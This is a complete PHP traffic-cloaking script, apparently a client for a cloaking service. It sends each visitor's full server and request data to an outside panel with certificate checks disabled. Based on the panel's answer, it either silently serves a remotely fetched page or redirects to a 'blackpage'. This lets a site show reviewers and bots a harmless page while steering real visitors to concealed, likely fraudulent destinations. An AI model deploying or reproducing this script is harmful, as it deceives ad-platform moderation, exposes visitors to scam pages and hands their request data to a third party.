<?php
$mainserver = 'https://panel.cloakit.space/';
$reserveserver = 'https://cloakit.tech/';

$data = array(
   '_server' => json_encode($_SERVER),
   'user' => '2b99bf87af3a1a051cc3a9ac98979cd1',
   'company' => '2741'
);
$ch = curl_init();
$optArray = array(
    CURLOPT_URL => $mainserver.'connect_v2',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => $data
);

curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
$responses = json_decode($result, true);
if ($_SERVER['QUERY_STRING']!='') {
  $responses['oldpage'] = $responses['page'];
  $responses['page'] = $responses['page'].'?'.$_SERVER['QUERY_STRING'];
}
else {
  $responses['oldpage'] = $responses['page'];
}

$arrContextOptions=array(
    'ssl'=>array(
        'verify_peer'=>false,
        'verify_peer_name'=>false,
    ),
);

if ($responses['mode']=='load') {
  $html = file_get_contents($responses['page'], false, stream_context_create($arrContextOptions));
  $html = str_replace('<head>', '<head><base href="'.$responses['oldpage'].'" />', $html);
  echo $html;
}
else if ($responses['mode']=='redirect') {
  if ($responses['type']=='blackpage') {
    header('Location: '.$responses['page']);
  }
  else {
    $html = file_get_contents($responses['page'], false, stream_context_create($arrContextOptions));
    $html = str_replace('<head>', '<head><base href="'.$responses['oldpage'].'" />', $html);
    echo $html;
  }
}
else if (!$responses || $responses['mode']=='') {
  $ch = curl_init();
  $optArray = array(
      CURLOPT_URL => $reserveserver.'connect_v2',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_SSL_VERIFYHOST => false,
      CURLOPT_SSL_VERIFYPEER => false,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => $data
  );

  curl_setopt_array($ch, $optArray);
  $result = curl_exec($ch);
  curl_close($ch);
  $responses = json_decode($result, true);
  if ($_SERVER['QUERY_STRING']!='') {
    $responses['oldpage'] = $responses['page'];
    $responses['page'] = $responses['page'].'?'.$_SERVER['QUERY_STRING'];
  }
  else {
    $responses['oldpage'] = $responses['page'];
  }

  if ($responses['mode']=='load') {
    $html = file_get_contents($responses['page'], false, stream_context_create($arrContextOptions));
    $html = str_replace('<head>', '<head><base href="'.$responses['oldpage'].'" />', $html);
    echo $html;
  }
  else if ($responses['mode']=='redirect') {
    if ($responses['type']=='blackpage') {
      header('Location: '.$responses['page']);
    }
    else {
      $html = file_get_contents($responses['page'], false, stream_context_create($arrContextOptions));
      $html = str_replace('<head>', '<head><base href="'.$responses['oldpage'].'" />', $html);
      echo $html;
    }
  }
}
?>